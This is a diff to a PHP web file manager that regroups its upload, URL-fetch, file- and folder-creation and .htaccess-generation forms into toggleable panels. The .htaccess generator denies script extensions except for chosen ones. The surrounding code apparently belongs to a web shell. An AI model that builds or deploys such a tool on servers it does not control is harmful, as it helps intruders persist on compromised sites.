@@ -993,69 +993,55 @@ if (!$disabled_funcs) {
             </form>
         </div>
 
-        <!-- File Operations -->
-        <div class="grid">
-            <div class="card">
-                <h3>Upload File</h3>
-                <form method="POST" enctype="multipart/form-data">
-                    <div class="form-group">
-                        <input type="file" name="file" class="form-control" id="file-upload">
-                        <label for="file-upload" style="display: block; margin-top: 10px; color: #667eea; cursor: pointer; font-weight: 500;">
-                            📎 Choose file or drag & drop here
-                        </label>
-                    </div>
-                    <button type="submit" class="btn btn-success">🚀 Upload File</button>
-                </form>
-                <form method="POST" style="margin-top:12px;">
-                    <div class="form-group">
-                        <input type="text" name="upload_url" class="form-control" placeholder="Paste file URL here...">
-                    </div>
-                    <div class="form-group">
-                        <input type="text" name="output_name" class="form-control" placeholder="Output filename (optional)">
-                    </div>
-                    <button type="submit" class="btn btn-success">🌐 Upload from URL</button>
+        <!-- File Operations (Compact Toolbar) -->
+        <div class="card" style="margin-bottom:18px;">
+            <h3 style="margin-top:0;display:flex;align-items:center;gap:10px;">File Operations
+                <small style="font-size:11px;font-weight:400;color:#6f859d;">(lebih ringkas)</small>
+            </h3>
+            <div style="display:flex;flex-wrap:wrap;gap:8px;margin:4px 0 14px;">
+                <button type="button" class="btn" onclick="togglePanel('op-upload')">📤 Upload</button>
+                <button type="button" class="btn" onclick="togglePanel('op-url')">🌐 URL Upload</button>
+                <button type="button" class="btn" onclick="togglePanel('op-folder')">📁 New Folder</button>
+                <button type="button" class="btn" onclick="togglePanel('op-file')">📝 New File</button>
+                <button type="button" class="btn" onclick="togglePanel('op-ht')">🛡️ .htaccess</button>
+                <button type="button" class="btn" onclick="collapseAll()" style="background:#475569;">➖ Collapse All</button>
+            </div>
+            <div id="op-upload" class="op-panel" style="display:none;">
+                <form method="POST" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px;">
+                    <input type="file" name="file" class="form-control" style="padding:7px;">
+                    <button type="submit" class="btn btn-success" style="align-self:flex-start;">🚀 Upload File</button>
                 </form>
             </div>
-
-            <div class="card">
-                <h3>Create Folder</h3>
-                <form method="POST">
-                    <div class="form-group">
-                        <input type="text" name="newfolder" placeholder="Enter folder name..." class="form-control">
-                    </div>
+            <div id="op-url" class="op-panel" style="display:none;margin-top:14px;">
+                <form method="POST" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;">
+                    <input type="text" name="upload_url" class="form-control" placeholder="File URL...">
+                    <input type="text" name="output_name" class="form-control" placeholder="Output filename (optional)">
+                    <button type="submit" class="btn btn-success" style="min-width:160px;">🌐 Upload from URL</button>
+                </form>
+            </div>
+            <div id="op-folder" class="op-panel" style="display:none;margin-top:14px;">
+                <form method="POST" style="display:flex;gap:10px;flex-wrap:wrap;">
+                    <input type="text" name="newfolder" placeholder="Folder name" class="form-control" style="flex:1;min-width:200px;">
                     <button type="submit" class="btn btn-success">✨ Create Folder</button>
                 </form>
             </div>
-
-            <div class="card">
-                <h3>Create File</h3>
-                <form method="POST">
-                    <div class="form-group">
-                        <input type="text" name="newfile" placeholder="Enter file name..." class="form-control">
-                    </div>
-                    <div class="form-group">
-                        <textarea name="newfile_content" class="form-control" placeholder="Optional initial content" style="min-height: 80px;"></textarea>
-                    </div>
-                    <button type="submit" class="btn btn-success">📝 Create File</button>
+            <div id="op-file" class="op-panel" style="display:none;margin-top:14px;">
+                <form method="POST" style="display:flex;flex-direction:column;gap:10px;">
+                    <input type="text" name="newfile" placeholder="File name" class="form-control">
+                    <textarea name="newfile_content" class="form-control" placeholder="Initial content (optional)" style="min-height:90px;"></textarea>
+                    <button type="submit" class="btn btn-success" style="width:160px;">📝 Create File</button>
                 </form>
             </div>
-
-            <div class="card">
-                <h3>Create .htaccess</h3>
-                <p style="color:#9fb7d8;">Generate a basic .htaccess to deny access to common script/file extensions. You can add comma-separated exclude patterns (eg. index.php, sitemap.xml, *.css).</p>
-                <form method="POST">
-                    <div class="form-group">
-                        <label>Exclude patterns (comma or space separated):</label>
-                        <input type="text" name="ht_exclude" class="form-control" placeholder="index.php sitemap.xml *.css">
+            <div id="op-ht" class="op-panel" style="display:none;margin-top:14px;">
+                <form method="POST" style="display:flex;flex-direction:column;gap:12px;">
+                    <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                        <input type="text" name="ht_exclude" class="form-control" placeholder="Exclude: index.php *.css" style="flex:1;min-width:260px;">
+                        <button type="submit" name="create_htaccess" class="btn btn-success" style="min-width:160px;">Create .htaccess</button>
                     </div>
-                    <div class="form-group">
-                        <label>Custom .htaccess content (optional):</label>
-                        <textarea name="ht_content" class="form-control" style="min-height:120px;"><?php echo isset($default_ht) ? htmlspecialchars($default_ht) : htmlspecialchars("<FilesMatch "."\\.(cgi|pl|py|php|php3|php4|php5|phtml)\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n\nOptions -Indexes\n"); ?></textarea>
-                    </div>
-                    <button type="submit" name="create_htaccess" class="btn btn-success">Create .htaccess</button>
+                    <textarea name="ht_content" class="form-control" style="min-height:140px;" placeholder="Custom .htaccess (leave blank to use default)"><?php echo isset($default_ht) ? htmlspecialchars($default_ht) : htmlspecialchars("<FilesMatch "."\\.(cgi|pl|py|php|php3|php4|php5|phtml)\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n\nOptions -Indexes\n"); ?></textarea>
                 </form>
                 <?php if (!empty($msg) && strpos($msg, '.htaccess') !== false): ?>
-                    <div class="alert alert-success" style="margin-top:8px;"><?php echo htmlspecialchars($msg); ?></div>
+                    <div class="alert alert-success" style="margin-top:10px;"><?php echo htmlspecialchars($msg); ?></div>
                 <?php endif; ?>
             </div>
         </div>
@@ -1724,6 +1710,24 @@ function toggleEdit(btn) {
     if (sibling) {
         sibling.style.display = (sibling.style.display === 'none' || sibling.style.display === '') ? 'block' : 'none';
     }
+}
+
+// File operations panel toggler
+function togglePanel(id){
+    var el=document.getElementById(id);
+    if(!el) return;
+    var visible=el.style.display!=="none" && el.style.display!=="";
+    if(visible){ el.style.display='none'; return; }
+    // hide others
+    var panels=document.querySelectorAll('.op-panel');
+    for(var i=0;i<panels.length;i++){ panels[i].style.display='none'; }
+    el.style.display='block';
+    // scroll into view a bit for mobile
+    setTimeout(function(){ try{ el.scrollIntoView({behavior:'smooth', block:'start'});}catch(e){} },100);
+}
+function collapseAll(){
+    var panels=document.querySelectorAll('.op-panel');
+    for(var i=0;i<panels.length;i++){ panels[i].style.display='none'; }
 }
 </script>
 <!-- No JS needed for modals; using CSS :target -->
